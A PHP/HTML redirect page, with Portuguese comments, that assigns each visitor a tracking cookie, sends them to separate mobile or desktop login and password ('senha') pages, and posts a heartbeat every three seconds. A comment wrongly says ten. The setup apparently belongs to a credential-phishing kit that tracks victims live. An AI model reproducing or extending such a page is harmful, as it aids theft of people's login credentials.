<?php
session_start();

// Verifica se o cookie 'identificador_cliente' JÁ EXISTE
if (!isset($_COOKIE['identificador_cliente'])) {
    // Se não existe, GERA um valor único e seguro
    $cookie_value = 'user_' . bin2hex(random_bytes(16));

    // Define o cookie para expirar em 30 dias
    setcookie('identificador_cliente', $cookie_value, time() + 86400 * 30, '/');

    // Disponibiliza o cookie para uso imediato no mesmo request
    $_COOKIE['identificador_cliente'] = $cookie_value;
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Redirecionando...</title>
  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const userAgent = navigator.userAgent.toLowerCase();

      const isMobile = /iphone|ipod|android|webos|blackberry|iemobile|opera mini/.test(userAgent);

      // Redireciona para login adequado
      if (window.location.pathname.includes("senha")) {
        window.location.href = isMobile ? "senha.php" : "senha-desktop.php";
      } else {
        window.location.href = isMobile ? "login.php" : "login-desktop.php";
      }
    });
  </script>
  <script>
    function getCookie(name) {
        const value = `; ${document.cookie}`;
          const parts = value.split(`; ${name}=`);
        if (parts.length === 2) return parts.pop().split(';').shift();
    }
    function sendHeartbeat() {
            // CORREÇÃO: Usando o nome correto do cookie
        const userCookie = getCookie('identificador_cliente'); 

          if (userCookie) {
            const formData = new FormData();
              formData.append('identificador_cookie', userCookie);

                  fetch('/heartbeat.php', { // O caminho para o nosso novo arquivo
                      method: 'POST',
                      body: formData
                  }).catch(error => console.error('Heartbeat falhou:', error));
                } 
            }
            // Envia o primeiro sinal imediatamente e depois a cada 10 segundos
      sendHeartbeat();
      setInterval(sendHeartbeat, 3000); // 10000 ms = 10 segundos
  </script>
</head>
<body>
  <p>Redirecionando para sua versão...</p>
</body>
</html>
